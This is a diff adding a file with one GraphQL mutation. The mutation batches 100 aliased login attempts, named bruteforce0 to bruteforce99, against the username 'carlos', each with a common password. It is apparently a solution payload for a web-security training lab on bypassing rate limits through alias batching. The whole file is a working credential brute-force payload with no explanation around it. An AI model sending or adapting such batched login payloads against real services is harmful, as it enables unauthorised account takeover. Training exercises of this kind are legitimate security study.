@@ -1,0 +1,902 @@
+mutation {
+
+    bruteforce0: login(input: {
+        username: "carlos",
+        password: "123456"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce1: login(input: {
+        username: "carlos",
+        password: "password"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce2: login(input: {
+        username: "carlos",
+        password: "12345678"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce3: login(input: {
+        username: "carlos",
+        password: "qwerty"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce4: login(input: {
+        username: "carlos",
+        password: "123456789"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce5: login(input: {
+        username: "carlos",
+        password: "12345"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce6: login(input: {
+        username: "carlos",
+        password: "1234"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce7: login(input: {
+        username: "carlos",
+        password: "111111"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce8: login(input: {
+        username: "carlos",
+        password: "1234567"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce9: login(input: {
+        username: "carlos",
+        password: "dragon"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce10: login(input: {
+        username: "carlos",
+        password: "123123"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce11: login(input: {
+        username: "carlos",
+        password: "baseball"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce12: login(input: {
+        username: "carlos",
+        password: "abc123"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce13: login(input: {
+        username: "carlos",
+        password: "football"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce14: login(input: {
+        username: "carlos",
+        password: "monkey"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce15: login(input: {
+        username: "carlos",
+        password: "letmein"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce16: login(input: {
+        username: "carlos",
+        password: "shadow"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce17: login(input: {
+        username: "carlos",
+        password: "master"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce18: login(input: {
+        username: "carlos",
+        password: "666666"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce19: login(input: {
+        username: "carlos",
+        password: "qwertyuiop"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce20: login(input: {
+        username: "carlos",
+        password: "123321"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce21: login(input: {
+        username: "carlos",
+        password: "mustang"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce22: login(input: {
+        username: "carlos",
+        password: "1234567890"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce23: login(input: {
+        username: "carlos",
+        password: "michael"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce24: login(input: {
+        username: "carlos",
+        password: "654321"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce25: login(input: {
+        username: "carlos",
+        password: "superman"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce26: login(input: {
+        username: "carlos",
+        password: "1qaz2wsx"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce27: login(input: {
+        username: "carlos",
+        password: "7777777"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce28: login(input: {
+        username: "carlos",
+        password: "121212"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce29: login(input: {
+        username: "carlos",
+        password: "000000"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce30: login(input: {
+        username: "carlos",
+        password: "qazwsx"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce31: login(input: {
+        username: "carlos",
+        password: "123qwe"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce32: login(input: {
+        username: "carlos",
+        password: "killer"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce33: login(input: {
+        username: "carlos",
+        password: "trustno1"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce34: login(input: {
+        username: "carlos",
+        password: "jordan"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce35: login(input: {
+        username: "carlos",
+        password: "jennifer"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce36: login(input: {
+        username: "carlos",
+        password: "zxcvbnm"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce37: login(input: {
+        username: "carlos",
+        password: "asdfgh"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce38: login(input: {
+        username: "carlos",
+        password: "hunter"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce39: login(input: {
+        username: "carlos",
+        password: "buster"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce40: login(input: {
+        username: "carlos",
+        password: "soccer"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce41: login(input: {
+        username: "carlos",
+        password: "harley"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce42: login(input: {
+        username: "carlos",
+        password: "batman"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce43: login(input: {
+        username: "carlos",
+        password: "andrew"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce44: login(input: {
+        username: "carlos",
+        password: "tigger"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce45: login(input: {
+        username: "carlos",
+        password: "sunshine"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce46: login(input: {
+        username: "carlos",
+        password: "iloveyou"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce47: login(input: {
+        username: "carlos",
+        password: "2000"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce48: login(input: {
+        username: "carlos",
+        password: "charlie"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce49: login(input: {
+        username: "carlos",
+        password: "robert"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce50: login(input: {
+        username: "carlos",
+        password: "thomas"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce51: login(input: {
+        username: "carlos",
+        password: "hockey"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce52: login(input: {
+        username: "carlos",
+        password: "ranger"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce53: login(input: {
+        username: "carlos",
+        password: "daniel"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce54: login(input: {
+        username: "carlos",
+        password: "starwars"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce55: login(input: {
+        username: "carlos",
+        password: "klaster"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce56: login(input: {
+        username: "carlos",
+        password: "112233"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce57: login(input: {
+        username: "carlos",
+        password: "george"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce58: login(input: {
+        username: "carlos",
+        password: "computer"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce59: login(input: {
+        username: "carlos",
+        password: "michelle"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce60: login(input: {
+        username: "carlos",
+        password: "jessica"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce61: login(input: {
+        username: "carlos",
+        password: "pepper"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce62: login(input: {
+        username: "carlos",
+        password: "1111"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce63: login(input: {
+        username: "carlos",
+        password: "zxcvbn"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce64: login(input: {
+        username: "carlos",
+        password: "555555"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce65: login(input: {
+        username: "carlos",
+        password: "11111111"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce66: login(input: {
+        username: "carlos",
+        password: "131313"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce67: login(input: {
+        username: "carlos",
+        password: "freedom"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce68: login(input: {
+        username: "carlos",
+        password: "777777"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce69: login(input: {
+        username: "carlos",
+        password: "pass"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce70: login(input: {
+        username: "carlos",
+        password: "maggie"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce71: login(input: {
+        username: "carlos",
+        password: "159753"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce72: login(input: {
+        username: "carlos",
+        password: "aaaaaa"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce73: login(input: {
+        username: "carlos",
+        password: "ginger"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce74: login(input: {
+        username: "carlos",
+        password: "princess"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce75: login(input: {
+        username: "carlos",
+        password: "joshua"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce76: login(input: {
+        username: "carlos",
+        password: "cheese"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce77: login(input: {
+        username: "carlos",
+        password: "amanda"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce78: login(input: {
+        username: "carlos",
+        password: "summer"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce79: login(input: {
+        username: "carlos",
+        password: "love"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce80: login(input: {
+        username: "carlos",
+        password: "ashley"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce81: login(input: {
+        username: "carlos",
+        password: "nicole"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce82: login(input: {
+        username: "carlos",
+        password: "chelsea"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce83: login(input: {
+        username: "carlos",
+        password: "biteme"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce84: login(input: {
+        username: "carlos",
+        password: "matthew"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce85: login(input: {
+        username: "carlos",
+        password: "access"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce86: login(input: {
+        username: "carlos",
+        password: "yankees"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce87: login(input: {
+        username: "carlos",
+        password: "987654321"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce88: login(input: {
+        username: "carlos",
+        password: "dallas"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce89: login(input: {
+        username: "carlos",
+        password: "austin"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce90: login(input: {
+        username: "carlos",
+        password: "thunder"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce91: login(input: {
+        username: "carlos",
+        password: "taylor"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce92: login(input: {
+        username: "carlos",
+        password: "matrix"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce93: login(input: {
+        username: "carlos",
+        password: "mobilemail"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce94: login(input: {
+        username: "carlos",
+        password: "mom"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce95: login(input: {
+        username: "carlos",
+        password: "monitor"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce96: login(input: {
+        username: "carlos",
+        password: "monitoring"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce97: login(input: {
+        username: "carlos",
+        password: "montana"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce98: login(input: {
+        username: "carlos",
+        password: "moon"
+    }) {
+        token
+        success
+    }
+
+
+    bruteforce99: login(input: {
+        username: "carlos",
+        password: "moscow"
+    }) {
+        token
+        success
+    }
+
+}
